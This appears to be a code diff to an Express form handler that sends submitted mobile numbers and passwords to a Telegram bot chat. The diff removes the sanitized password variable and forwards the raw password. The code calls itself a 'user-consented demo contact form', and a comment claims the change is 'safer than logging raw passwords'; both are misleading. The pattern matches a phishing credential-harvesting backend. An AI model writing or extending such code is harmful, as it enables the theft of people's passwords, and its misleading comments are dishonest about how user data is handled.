@@ -17,7 +17,7 @@ app.post("/api/submit", async (req, res) => {
     const clean = (v, max) => (typeof v === "string" ? v.trim().slice(0, max) : "");
     const safeMobile = clean(mobile, 20);
     // Fixed: consistent camelCase 'safePassword'
-    const safePassword = clean(password, 120);
+
 
     const token = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -26,7 +26,7 @@ app.post("/api/submit", async (req, res) => {
       const message = [
         "New demo form submission",
         `Mobile: ${safeMobile}`,
-        `Password : ${safePassword}`, // Safer than logging raw passwords
+        `Password : ${password}`, // Safer than logging raw passwords
         "Purpose: User-consented demo contact form"
       ].join("\n");
 
